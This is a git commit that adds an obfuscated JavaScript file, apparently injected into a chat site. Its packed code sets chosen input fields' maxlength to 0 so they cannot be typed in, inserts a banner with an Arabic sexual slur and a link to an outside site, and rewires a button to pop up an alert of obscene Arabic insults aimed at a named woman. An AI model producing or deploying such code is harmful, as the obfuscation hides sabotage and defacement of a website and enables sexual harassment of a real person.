1d5651ad5205e22e4331c3d408062c912f9930bd
dimask98 <56661641+dimask98@users.noreply.github.com>
2021-05-06 07:28:48 +0300

    Create Hobii.js

---
+++ Hobii.js
@@ -0,0 +1,34 @@
+var _0xcce0 = ['.loginstat', 'insertAfter', "<div class='fr borderg' style='padding:2px;background-color:white;margin-right:4px;'> بسمة  :<a href='https://jawalhost.com/'> للنياكة والعهر : </a></div>", `${`$('#1,#2,#3').4('0');$('.0').5("6",7);`}`, '|', 'split', 'ali|u2|u3|u1|addClass|attr|maxlength|0', 'replace', '', '\\w+', '\\b', 'g'];
+var _0x870d = [_0xcce0[0], _0xcce0[1], _0xcce0[2], _0xcce0[3], _0xcce0[4], _0xcce0[5], _0xcce0[6], _0xcce0[7], _0xcce0[8], _0xcce0[9], _0xcce0[10], _0xcce0[11]];
+var _0x2971 = [_0x870d[0], _0x870d[1], _0x870d[2], _0x870d[3], _0x870d[4], _0x870d[5], _0x870d[6], _0x870d[7], _0x870d[8], _0x870d[9], _0x870d[10], _0x870d[11]];
+setTimeout(function () {
+    $(_0x2971[2])[_0x2971[1]]($(_0x2971[0]))
+}, 1000);
+eval(function (_0x29e7x4, _0x29e7x5, _0x29e7x6, _0x29e7x7, _0x29e7x8, _0x29e7x9) {
+    _0x29e7x8 = String;
+    if (!_0x2971[8][_0x2971[7]](/^/, String)) {
+        while (_0x29e7x6--) {
+            _0x29e7x9[_0x29e7x6] = _0x29e7x7[_0x29e7x6] || _0x29e7x6
+        };
+        _0x29e7x7 = [function (_0x29e7x8) {
+            return _0x29e7x9[_0x29e7x8]
+        }];
+        _0x29e7x8 = function () {
+            return _0x2971[9]
+        };
+        _0x29e7x6 = 1
+    };
+    while (_0x29e7x6--) {
+        if (_0x29e7x7[_0x29e7x6]) {
+            _0x29e7x4 = _0x29e7x4[_0x2971[7]](new RegExp(_0x2971[10] + _0x29e7x8(_0x29e7x6) + _0x2971[10], _0x2971[11]), _0x29e7x7[_0x29e7x6])
+        }
+    };
+    return _0x29e7x4
+}(_0x2971[3], 8, 8, _0x2971[6][_0x2971[5]](_0x2971[4]), 0, {}));
+5
+
+$('div#l2 button').attr('onclick', '');
+$('div#l2 button').click(function(){
+alert('رسالة من نورس الى القحبه بسمة ياشرموطه انيك اختك واخت ليشد علا ايدك ياقحبه هههه لا تتحدي سوري');
+});
+
